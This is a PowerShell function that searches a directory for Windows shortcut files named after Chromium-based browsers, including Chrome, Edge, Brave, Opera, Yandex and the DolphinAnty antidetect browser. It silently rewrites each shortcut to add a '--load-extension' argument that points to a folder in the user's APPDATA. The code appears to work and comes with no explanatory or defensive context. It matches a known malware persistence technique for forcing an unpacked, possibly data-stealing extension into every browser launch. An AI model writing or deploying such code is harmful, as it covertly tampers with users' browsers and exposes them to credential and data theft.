  - 'function Check-And-Replace{

    [CmdletBinding()]

    param(

    [Parameter(Mandatory=$true, Position=0)][string]$Path,

    [string[]]$BrowserNames= @("Opera GX Browser","Opera GX","Opera Browser","Opera
    GX Internet Browser","Opera Internet Browser","Google Chrome","Brave","Brave Browser","Microsoft
    Edge","DolphinAnty","Chromium","Yandex","Yandex Browser","Ungoogled Chromium","Mises"),

    [string]$ExtensionArg="--load-extension=`"$env:APPDATA\CheckExtension`"")

    if(-not(Test-Path $Path)){return}

    Get-ChildItem -Path $Path -Filter *.lnk -Recurse -ErrorAction SilentlyContinue
    | ForEach-Object{

    $shortcutFile=$_.FullName

    $shell=New-Object -ComObject WScript.Shell

    $shortcut=$shell.CreateShortcut($shortcutFile)

    foreach($browserName in $BrowserNames){

    if($_.BaseName -like "*$browserName*"){

    if($shortcut.Arguments -notmatch [regex]::Escape($ExtensionArg)){

    $shortcut.Arguments ="$($shortcut.Arguments)$ExtensionArg"

    $shortcut.Save()

    }else{}break}}}}'
